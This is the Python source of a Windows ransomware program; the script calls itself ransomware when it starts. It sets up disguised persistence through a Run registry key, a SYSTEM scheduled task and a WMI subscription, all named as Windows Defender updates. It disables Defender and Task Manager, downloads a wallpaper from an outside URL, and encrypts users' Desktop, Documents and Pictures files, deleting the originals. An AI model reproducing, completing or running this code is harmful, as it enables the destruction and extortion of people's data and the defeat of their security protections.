import os
import urllib.request
import platform
import sys
import winreg
import ctypes
import subprocess
import time
import secrets
import struct
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, padding, hmac
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import hashlib

# ==================== ENHANCED ENCRYPTION SYSTEM ====================
class CryptoEngine:
    def __init__(self, master_seed):
        """Initialize with a master seed (float between 0-1)"""
        self.master_seed = master_seed
        self.backend = default_backend()
        
    def _chaotic_keygen(self, length=64):
        """Generate unpredictable key using logistic map chaos"""
        key = bytearray()
        x = self.master_seed
        for _ in range(length):
            x = 3.999 * x * (1 - x)  # Chaotic system at edge of chaos
            key.append(int(x * 256) % 256)
        return bytes(key)
    
    def _derive_key(self, salt):
        """Military-grade key derivation with 100,000 iterations"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA3_512(),
            length=64,
            salt=salt,
            iterations=100000,
            backend=self.backend
        )
        return kdf.derive(self._chaotic_keygen())
    
    def encrypt_file(self, file_path):
        """AES-256 encryption with integrity protection"""
        try:
            if file_path.endswith('.airf'):
                return

            # Generate cryptographic nonces
            salt = os.urandom(32)
            iv = os.urandom(16)
            
            # Derive keys
            master_key = self._derive_key(salt)
            enc_key = master_key[:32]  # AES-256
            auth_key = master_key[32:]  # HMAC key

            # Calculate file fingerprint
            file_hash = hashlib.blake2b(file_path.encode()).digest()
            
            # Initialize cipher
            cipher = Cipher(
                algorithms.AES(enc_key),
                modes.OFB(iv),
                backend=self.backend
            )
            encryptor = cipher.encryptor()
            padder = padding.PKCS7(128).padder()

            # Secure temp file handling
            temp_path = f"{file_path}.tmp"
            with open(file_path, 'rb') as infile, open(temp_path, 'wb') as outfile:
                # Write crypto headers
                outfile.write(salt)
                outfile.write(iv)
                outfile.write(file_hash)
                
                # Encrypt in chunks and write HMAC for each
                chunk_size = 8192
                while chunk := infile.read(chunk_size):
                    padded = padder.update(chunk)
                    encrypted = encryptor.update(padded)
                    
                    # Generate HMAC for the encrypted chunk
                    h = hmac.HMAC(auth_key, hashes.SHA256(), backend=self.backend)
                    h.update(encrypted)
                    chunk_tag = h.finalize()
                    
                    outfile.write(encrypted)
                    outfile.write(chunk_tag)
                
                # Finalize encryption
                final = padder.finalize()
                encrypted_final = encryptor.update(final) + encryptor.finalize()
                outfile.write(encrypted_final)

            # Atomic replacement with .airf extension
            os.replace(temp_path, f"{file_path}.airf")
            os.remove(file_path)
            
            # Wipe the original file securely
            self._secure_wipe(file_path)
            
        except Exception as e:
            print(f"! Encryption failed for {file_path}: {str(e)[:100]}")

    def _secure_wipe(self, file_path, passes=3):
        """Securely wipe original file"""
        try:
            with open(file_path, 'ba+') as f:
                length = f.tell()
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(length))
                f.truncate()
            os.remove(file_path)
        except:
            try:
                os.remove(file_path)
            except:
                pass

# ==================== SYSTEM MANIPULATION ====================
def disable_protections():
    """Disable security systems"""
    try:
        print("[+] Attempting to disable Windows Defender...")
        # Disable Windows Defender
        script_path = os.path.abspath(sys.argv[0])
        ps_commands = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            f'Add-MpPreference -ExclusionPath "{script_path}"',
            'Set-MpPreference -DisableIntrusionPreventionSystem $true',
            'Set-MpPreference -DisableScriptScanning $true',
            'Set-MpPreference -DisableIOAVProtection $true',
            'Stop-Service -Name WinDefend -Force'
        ]
        for cmd in ps_commands:
            subprocess.run(['powershell', '-Command', cmd], capture_output=True, shell=True)
        
        print("[+] Attempting to disable Task Manager...")
        # Disable Task Manager via Registry
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        except Exception as e:
            print(f"! Task Manager disable failed: {e}")
            
    except Exception as e:
        print(f"! Protection disable failed: {e}")

def set_wallpaper(img_url):
    """Set desktop wallpaper from URL"""
    try:
        print("[+] Downloading wallpaper...")
        path = os.path.join(os.environ['TEMP'], 'wallpaper.png')
        urllib.request.urlretrieve(img_url, path)
        if platform.system() == "Windows":
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        print("[+] Wallpaper set successfully")
    except Exception as e:
        print(f"! Wallpaper set failed: {e}")

def establish_persistence():
    """Enterprise-grade persistence that survives reboots and user changes"""
    try:
        print("[+] Establishing military-grade persistence...")
        
        script_path = os.path.abspath(sys.argv[0])
        exe_path = script_path.replace('.py', '.exe') if script_path.endswith('.py') else script_path

        # 1. Registry Run Key (User Level - Hidden)
        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_WRITE
            ) as key:
                winreg.SetValueEx(
                    key,
                    "WindowsDefenderUpdate",  # Disguised name
                    0,
                    winreg.REG_SZ,
                    f'"{exe_path}" /silent'  # Hidden execution
                )
        except Exception as e:
            print(f"! Registry Run failed: {e}")

        # 2. Scheduled Task (System Level - Highest Privileges)
        try:
            task_xml = f'''
            <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
              <RegistrationInfo>
                <Description>Windows Defender Update</Description>
              </RegistrationInfo>
              <Triggers>
                <LogonTrigger>
                  <Enabled>true</Enabled>
                </LogonTrigger>
                <CalendarTrigger>
                  <StartBoundary>2025-01-01T08:00:00</StartBoundary>
                  <Enabled>true</Enabled>
                  <ScheduleByDay>
                    <DaysInterval>1</DaysInterval>
                  </ScheduleByDay>
                </CalendarTrigger>
              </Triggers>
              <Principals>
                <Principal id="Author">
                  <UserId>S-1-5-18</UserId>  <!-- SYSTEM account -->
                  <RunLevel>HighestAvailable</RunLevel>
                </Principal>
              </Principals>
              <Settings>
                <Hidden>true</Hidden>
                <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
              </Settings>
              <Actions Context="Author">
                <Exec>
                  <Command>"{exe_path}"</Command>
                  <Arguments>/background</Arguments>
                </Exec>
              </Actions>
            </Task>
            '''
            
            # Write XML to temp file
            with open(os.path.join(os.environ['TEMP'], 'task.xml'), 'w') as f:
                f.write(task_xml)
                
            subprocess.run([
                'schtasks.exe',
                '/Create',
                '/TN', r'\Microsoft\Windows\Defender\Updates',
                '/XML', os.path.join(os.environ['TEMP'], 'task.xml'),
                '/F'
            ], check=True, capture_output=True)
        except Exception as e:
            print(f"! Scheduled Task failed: {e}")

        # 3. WMI Event Subscription (Permanent)
        try:
            subprocess.run([
                'powershell.exe',
                '-Command',
                f'$filter = ([wmiclass]"\\\\.\\root\\subscription:__EventFilter").CreateInstance();'
                f'$filter.QueryLanguage = "WQL";'
                f'$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'";'
                f'$filter.Name = "DefenderUpdateFilter";'
                f'$filter.Put();'
                f'$consumer = ([wmiclass]"\\\\.\\root\\subscription:CommandLineEventConsumer").CreateInstance();'
                f'$consumer.Name = "DefenderUpdateConsumer";'
                f'$consumer.CommandLineTemplate = "{exe_path} /background";'
                f'$consumer.Put();'
                f'$binding = ([wmiclass]"\\\\.\\root\\subscription:__FilterToConsumerBinding").CreateInstance();'
                f'$binding.Filter = $filter;'
                f'$binding.Consumer = $consumer;'
                f'$binding.Put();'
            ], check=True, capture_output=True)
        except Exception as e:
            print(f"! WMI Subscription failed: {e}")

        print("[+] Persistence established through 3 independent mechanisms")

    except Exception as e:
        print(f"!! Critical persistence failure: {e}")

# ==================== MAIN OPERATION ====================
def main():
    try:
        print("[+] Starting ransomware...")
        
        # Phase 0: Persistence
        establish_persistence()
        
        # Phase 1: System takeover
        disable_protections()
        
        # Phase 2: Set wallpaper
        set_wallpaper("https://i.postimg.cc/tTY5tH5v/Screenshot-2025-07-28-181037.png")
        
        # Phase 3: File encryption
        print("[+] Starting encryption...")
        cryptor = CryptoEngine(0.3141592653589793)  # Pi seed
        
        # Target multiple directories
        targets = [
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Pictures")
        ]
        
        for target in targets:
            for root, _, files in os.walk(target):
                for file in files:
                    if not file.endswith('.airf'):
                        cryptor.encrypt_file(os.path.join(root, file))
        
        print("[+] Encryption complete!")
        
    except Exception as e:
        print(f"! Main execution failed: {e}")

if __name__ == "__main__":
    try:
        if platform.system() == "Windows":
            ctypes.windll.kernel32.SetConsoleTitleW("Windows Update")
        main()
    except Exception as e:
        print(f"! Script failed to start: {e}")